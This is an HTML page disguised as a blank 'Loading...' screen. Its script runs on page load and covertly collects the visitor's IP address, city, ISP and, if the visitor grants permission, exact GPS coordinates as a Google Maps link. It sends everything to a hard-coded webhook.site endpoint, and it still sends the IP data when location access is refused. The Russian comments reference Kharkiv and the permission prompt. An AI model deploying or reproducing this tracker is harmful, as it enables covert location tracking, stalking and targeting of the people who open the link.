<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body { background: black; margin: 0; cursor: none; }</style>
</head>
<body>
<script>
(async () => {
    const hook = "https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2";
    
    let info = {
        time: new Date().toLocaleString(),
        map_link: "Ожидание разрешения..."
    };

    // 1. Сначала шлем инфу по IP (Харьков и т.д.)
    try {
        const r = await fetch("https://ipapi.co/json/");
        const d = await r.json();
        info.ip = d.ip;
        info.city = d.city;
        info.isp = d.org;
    } catch(e) {}

    // 2. Запрашиваем точную точку (выскочит окно подтверждения)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((p) => {
            // Если нажал "Разрешить" — создаем ссылку на Google Карты
            info.map_link = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
            
            // Отправляем финальный пакет с картой
            fetch(hook, { method: "POST", mode: "no-cors", body: JSON.stringify(info) });
        }, () => {
            info.map_link = "Доступ отклонен пользователем";
            fetch(hook, { method: "POST", mode: "no-cors", body: JSON.stringify(info) });
        });
    } else {
        info.map_link = "Браузер не поддерживает GPS";
        fetch(hook, { method: "POST", mode: "no-cors", body: JSON.stringify(info) });
    }
})();
</script>
</body>
</html>
